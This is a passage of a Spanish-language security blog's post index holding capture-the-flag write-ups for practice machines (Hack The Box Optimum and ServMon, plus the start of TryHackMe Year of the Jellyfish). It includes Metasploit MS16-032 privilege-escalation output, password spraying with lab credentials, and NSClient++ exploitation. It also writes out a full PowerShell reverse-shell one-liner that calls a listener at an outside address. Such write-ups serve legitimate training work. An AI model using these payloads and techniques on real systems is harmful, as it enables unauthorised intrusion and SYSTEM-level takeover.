(exploit/windows/local/ms16_032_secondary_logon_handle_privesc): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows x86 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.17:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\kostas\\AppData\\Local\\Temp\\ZJtaKHP.ps1... [*] Compressing script contents... [+] Compressed size: 3592 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u0026gt; @FuzzySec] [?] Operating system core count: 2 [\u0026gt;] Duplicating CreateProcessWithLogonW handle [?] Done, using thread handle: 2132 [*] Sniffing out privileged impersonation token.. [?] Thread belongs to: svchost [+] Thread suspended [\u0026gt;] Wiping current impersonation token [\u0026gt;] Building SYSTEM impersonation token [?] Success, open SYSTEM token handle: 2128 [+] Resuming thread.. [*] Sniffing out SYSTEM shell.. [\u0026gt;] Duplicating SYSTEM token [\u0026gt;] Starting token race [\u0026gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! rvSZF4j6pWHx64CLwEtV13a20uTvKd0o [+] Executed on target machine. [*] Sending stage (175174 bytes) to 10.10.10.8 [*] Meterpreter session 2 opened (10.10.14.17:4444 -\u0026gt; 10.10.10.8:49193) at 2021-05-12 01:21:58 -0400 [+] Deleted C:\\Users\\kostas\\AppData\\Local\\Temp\\ZJtaKHP.ps1 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; shell Process 1896 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Documents\u0026gt;cd C:\\users\\administrator\\desktop cd C:\\users\\administrator\\desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of C:\\Users\\Administrator\\Desktop 18/03/2017 03:14 \u0026lt;DIR\u0026gt; . 18/03/2017 03:14 \u0026lt;DIR\u0026gt; .. 18/03/2017 03:14 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 31.891.406.848 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;type root.txt type root.txt 51ed1b36553c8461f4552c2e92b3eeed C:\\Users\\Administrator\\Desktop\u0026gt;   ","description":"Optimum es una maquina de HackTheBox, descubrimos una vulnerabilidad en HttpFileServer que nos dio acceso. Obtuvimos informacion de con SystemInfo, con Windows Exploit Suggester y Sherlock lo que nos permitió explotar MS16-032.","id":10,"section":"posts","tags":["httpfileserver","windows exploit suggester","MS16-032","metasploit"],"title":"Hack The Box - Optimum","uri":"https://sckull.github.io/posts/optimum/"},{"content":"  ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH. Finalmente encontramos NSClient lo que nos llevo a realizar un Tunnel con SSH para obtener el puerto localmente y explotar una vulnerabilidad que nos dio acceso privilegiado.\nInformacion de la Maquina    Nombre ServMon      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.184   Maker del_KZx497Ju    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 4.8, 7.4, 2.6, 5.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ftp (21), ss h(22), http (80), smb (139, 445), RPC (135).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  # Nmap 7.91 scan initiated Wed May 12 19:53:55 2021 as: nmap -Pn -p21,22,80,135,139,445,5040,5666,6063,6699,7680,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN port_scan 10.10.10.184 Nmap scan report for 10.10.10.184 (10.10.10.184) Host is up (0.096s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM \u0026lt;DIR\u0026gt; Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; | \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; | \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; | window.location.href = \u0026#34;Pages/login.htm\u0026#34;; | \u0026lt;/script\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5040/tcp open unknown 5666/tcp open tcpwrapped 6063/tcp open tcpwrapped 6699/tcp open napster? 7680/tcp open pando-pub? 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=5/12%Time=609C6A98%P=x86_64-pc-linux-gnu%r(NULL SF:,6B,\u0026#34;HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/ht SF:ml\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n SF:\\r\\n\u0026#34;)%r(GetRequest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20tex SF:t/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x SF:20\\r\\n\\r\\n\\xef\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20X SF:HTML\\x201\\.0\\x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/D SF:TD/xhtml1-transitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\. SF:org/1999/xhtml\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;script\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20window\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;) SF:%r(HTTPOptions,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/htm SF:l\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\ SF:n\\r\\n\\xef\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\ SF:x201\\.0\\x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xh SF:tml1-transitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1 SF:999/xhtml\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x SF:20\\x20\u0026lt;script\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20window\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(RT SF:SPRequest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\n SF:Content-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n SF:\\xef\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\ SF:.0\\x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1- SF:transitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/x SF:html\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x2 SF:0\u0026lt;script\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20window\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4m17s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-13T00:00:59 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 12 19:57:10 2021 -- 1 IP address (1 host up) scanned in 195.09 seconds   FTP En el servicio FTP encontramos dos archivos en las carpetas de los usuarios Nadine y Nathan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ftp\u0026gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:06PM \u0026lt;DIR\u0026gt; Nadine 01-18-20 12:08PM \u0026lt;DIR\u0026gt; Nathan 226 Transfer complete. ftp\u0026gt; dir Nadine 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:08PM 174 Confidential.txt 226 Transfer complete. ftp\u0026gt; dir Nathan 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:10PM 186 Notes to do.txt 226 Transfer complete. ftp\u0026gt;   El primer archivo indica que la contraseña de Nathan esta en el escritorio y en el archivo Passwords.txt. En el segundo archivo se listan cosas por hacer.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  π ~/htb/servmon ❯ cat Confidential.txt Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine π ~/htb/servmon ❯ cat Notes\\ to\\ do.txt 1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint   SMB Intentamos listar los recursos compartidos con una sesion nula pero no tenemos acceso.\n1 2 3  π ~/htb/servmon ❯ cme smb 10.10.10.184 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.184 445 SERVMON [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False) SMB 10.10.10.184 445 SERVMON [-] ServMon\\: STATUS_ACCESS_DENIED   NADINE - USER HTTP Encontramos un login de NVMS 1000.\nNVMS 1000 - Directory Traversal Realizamos una busqueda de vulnerabilidades en NVMS y vemos un exploit que indica una vulnerabilidad Directory Traversal, tambien vemos el exploit que realiza la \u0026ldquo;explotacion\u0026rdquo;.\nEn una de las notas indica que existe un archivo en el escritorio de uno de los usuarios, realizamos una solicitud a ese archivo y encontramos varias contraseñas.\nUtilizamos crackmapexec con una pequeña lista de usuarios y contraseñas al servicio smb, logramos encontrar las correctas aunque no vemos ningun recurso en samba, por lo que verificamos en SSH y logramos ver que la contraseña es aceptada con el usuario nadine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  π ~/htb/servmon ❯ cme smb 10.10.10.184 -u users.txt -p passwords.txt SMB 10.10.10.184 445 SERVMON [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False) SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [+] ServMon\\nadine:L1k3B1gBut7s@W0rk π ~/htb/servmon ❯ cme smb 10.10.10.184 -u \u0026#39;nadine\u0026#39; -p \u0026#39;L1k3B1gBut7s@W0rk\u0026#39; --shares SMB 10.10.10.184 445 SERVMON [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False) SMB 10.10.10.184 445 SERVMON [+] ServMon\\nadine:L1k3B1gBut7s@W0rk SMB 10.10.10.184 445 SERVMON [+] Enumerated shares SMB 10.10.10.184 445 SERVMON Share Permissions Remark SMB 10.10.10.184 445 SERVMON ----- ----------- ------ SMB 10.10.10.184 445 SERVMON ADMIN$ Remote Admin SMB 10.10.10.184 445 SERVMON C$ Default share SMB 10.10.10.184 445 SERVMON IPC$ READ Remote IPC π ~/htb/servmon ❯ cme ssh 10.10.10.184 -u \u0026#39;nadine\u0026#39; -p \u0026#39;L1k3B1gBut7s@W0rk\u0026#39; SSH 10.10.10.184 22 10.10.10.184 [*] SSH-2.0-OpenSSH_for_Windows_7.7 SSH 10.10.10.184 22 10.10.10.184 [+] nadine:L1k3B1gBut7s@W0rk   Ingresamos por medio de SSH, logramos obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10  Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON C:\\Users\\Nadine\u0026gt;whoami servmon\\nadine nadine@SERVMON C:\\Users\\Nadine\u0026gt;type Desktop\\user.txt 924e7dffa2f7c2e53e3c9c1bc6211065 nadine@SERVMON C:\\Users\\Nadine\u0026gt;   PRIVILEGE ESCALATION Realizamos una enumeracion de archivos, y encontramos que existe NSClient++, tras realizar una busqueda de exploits encontramos que es posible escalar privilegios utilizando un archivo .bat, además un exploit - Authenticated Remote Code Execution  para ejecutar comandos remotamente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  PS C:\\Program Files\u0026gt; dir Directory: C:\\Program Files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 08/04/2020 23:21 Common Files d----- 08/04/2020 23:18 Internet Explorer d----- 19/03/2019 04:52 ModifiableWindowsApps d----- 16/01/2020 18:11 NSClient++ d----- 08/04/2020 23:09 Reference Assemblies [... REDACTED ...]   Verificamos que NSCP estuviera corriendo, además verificamos en que puerto esta disponible. Tambien verificamos el archivo de configuracion donde encontramos la contraseña y vemos que solo estan \u0026ldquo;permitidas conexiones\u0026rdquo; desde 127.0.0.1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  PS C:\\Users\\Nadine\u0026gt; Get-Service -Name nscp | Select-Object * Name : nscp RequiredServices : CanPauseAndContinue : False CanShutdown : False CanStop : True DisplayName : NSClient++ Monitoring Agent DependentServices : MachineName : . ServiceName : nscp ServicesDependedOn : ServiceHandle : Status : Running ServiceType : Win32OwnProcess StartType : Site : Container : PS C:\\Program Files\u0026gt; ps |findstr \u0026#34;nscp\u0026#34; 442 31 18976 30632 2660 0 nscp PS C:\\Program Files\u0026gt; netstat -ano | findstr \u0026#34;2660\u0026#34; TCP 0.0.0.0:5666 0.0.0.0:0 LISTENING 2660 TCP 0.0.0.0:5666 0.0.0.0:0 LISTENING 2660 TCP 0.0.0.0:8443 0.0.0.0:0 LISTENING 2660 TCP [::]:5666 [::]:0 LISTENING 2660 UDP 0.0.0.0:51512 *:* 2660 UDP 127.0.0.1:51511 *:* 2660 PS C:\\Program Files\u0026gt; cd NSCLIENT++ PS C:\\Program Files\\NSCLIENT++\u0026gt; cat .\\nsclient.ini # If you want to fill this file with all available options run the following command: # nscp settings --generate --add-defaults --load-all # If you want to activate a module and bring in all its options use: # nscp settings --activate-module \u0026lt;MODULE NAME\u0026gt; --add-defaults # For details run: nscp settings --help ; in flight - TODO [/settings/default] ; Undocumented key password = ew2x6SsGTxjRwXOT ; Undocumented key allowed hosts = 127.0.0.1   Para realizar la explotacion primero obtuvimos el puerto 8443 localmente utilizando ssh.\n1  ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184   Tras obtener el puerto localmente, obtuvimos la contraseña, utilizando nscp.exe.\n1 2 3  PS C:\\program files\\nsclient++\u0026gt; .\\nscp.exe web -- password --display Current password: ew2x6SsGTxjRwXOT PS C:\\program files\\nsclient++\u0026gt;   Tras analizar el exploit creamos dos archivos, nc64.exe, para ejecutar una shell inversa que a continuacion se explica de dos \u0026ldquo;formas\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10  PS C:\\Temp\u0026gt; dir Directory: C:\\Temp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 14/05/2021 01:39 680 exec.bat -a---- 14/05/2021 01:50 45272 nc64.exe PS C:\\Temp\u0026gt;   CheckExternalScripts [1] Para la explotacion creamos un nuevo script en Settings.\nLe agregamos un alias, el script o comando a ejecutar y guardamos.\nGuardamos los cambios en la opcion Changes.\nNos dirigimos a Modules, activamos y desactivamos el modulo en el check, esto guardará y activará los scripts creados.\nLuego nos dirigimos a Modulos \u0026gt; CheckExternalScripts \u0026gt; Queries donde observamos los scripts previamente creados.\nEl script que ejecuta el archivo C:\\Temp\\exec.bat que contiene una shell inversa para powershell no funcionó con esta \u0026ldquo;forma\u0026rdquo;.\nNos dirigimos al querie script_shell y Run, donde ejecutamos nuestro script.\nLuego de esto nuestra shell inversa será ejecutada, con lo cual obtenemos una shell nt authority\\system y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13  π ~/htb/servmon ❯ sudo nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.3] from 10.10.10.184 [10.10.10.184] 52222 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Program Files\\NSClient++\u0026gt;whoami whoami nt authority\\system C:\\Program Files\\NSClient++\u0026gt;type \u0026#34;C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; type \u0026#34;C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; 0f4b1f505e07879477a1ebdd7bccb170   CheckExternalScripts [2] Creamos una shell inversa con powershell y colocamos el puerto 80 a la escucha con netcat.\n1 2  powershell -nop -W hidden -noni -ep bypass -c \u0026#34;$TCPClient= New-Object Net.Sockets.TCPClient(\u0026#39;10.10.14.17\u0026#39;, 80);$NetworkStream= $TCPClient.GetStream();$StreamWriter= New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String+ \u0026#39;SHELL\u0026gt; \u0026#39;);$StreamWriter.Flush()}WriteToStream \u0026#39;\u0026#39;;while(($BytesRead= $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command= ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead- 1);$Output= try {Invoke-Expression $Command2\u0026gt;\u0026amp;1 | Out-String} catch {$_| Out-String}WriteToStream ($Output)}$StreamWriter.Close()\u0026#34; # π ~/htb/servmon ❯ sudo nc -lvp 80   Para obtener una shell utilizamos unicamente el modulo CheckExternalScripts el cual contiene la opcion en configuracion del modulo para ejecutar comando. Nos dirigimos a modulos donde encontramos CheckExternalScripts y en configuraciones de /settings/external scripts/scripts/default agregamos en command nuestra shell inversa. Regresamos nuevamente al modulo CheckExternalScripts, desactivamos y activamos.\nLo cual ejecutará el comando previiamente creado (shell inversa) y con el logramos obtener una shell nt authority\\system y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  π ~/htb/servmon ❯ sudo nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.17] from 10.10.10.184 [10.10.10.184] 56431 SHELL\u0026gt; whoami nt authority\\system SHELL\u0026gt; cd C:\\Users\\Administrator\\Desktop SHELL\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 13/05/2021 06:55 34 root.txt SHELL\u0026gt; type root.txt 034e2552b8082e806157bff19bab470c    NSClient++ Windows Conf  ","description":"ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH. Finalmente encontramos NSClient lo que nos llevo a realizar un Tunnel con SSH para obtener el puerto localmente y explotar una vulnerabilidad que nos dio acceso privilegiado.","id":11,"section":"posts","tags":["ftp","smb","crackmapexec","nsclient++","powershell"],"title":"Hack The Box - ServMon","uri":"https://sckull.github.io/posts/servmon/"},{"content":"  Year of the Jellyfish es una maquina de TryHackMe, descubrimos dominios y subdominios con SSLSCAN lo que nos permitio encontrar una vulnerabilidad en Monitorr, se muestran dos formas para realizar bypass al filtro de ficheros lo que permitio obtener acceso. Finalmente ejecutamos Linpeas lo que nos guió una vulnerabilidad en snapd la cual explotamos para obtener acceso privilegiado.\nRoom    Titulo Year of the Jellyfish      Descripción Some boxes sting\u0026hellip;   Puntos 110   Dificultad Dificil   Maker MuirlandOracle     NMAP Escaneo de puertos con nmap muestra el puerto ftp (21), ssh (22, 22222), http (80, 8000) y el puerto https (443) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # Nmap 7.91 scan initiated Tue Apr 27 02:29:03 2021 as: nmap -sC -sV -p21,22,80,443,8000,22222 -oN allports 54.171.187.11 Nmap scan report for jelly.thm (54.171.187.11) Host is up (0.44s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA) 80/tcp open http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Did not follow redirect to https://robyns-petshop.thm/ 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Robyn\u0026amp;#039;s Pet Shop | ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB | Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm | Not valid before: 2021-04-27T06:04:33 |_Not valid after: 2022-04-27T06:04:33 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 8000/tcp open http-alt | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Length: 15 |_ Request 22222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA) | 256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA) |_ 256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (ED25519) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.91%I=7%D=4/27%Time=6087AF3C%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,3F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Length:\\x2 SF:015\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Apr 27 02:29:44 2021 -- 1 IP address (1 host up) scanned in 40.32 seconds   HTTP Encontramos una pagina en el puerto 80 la cual redirige hacia un dominio.\n1 2 3 4 5  HTTP/1.1 302 Found Date: Tue, 27 Apr 2021 06:23:18 GMT Server: 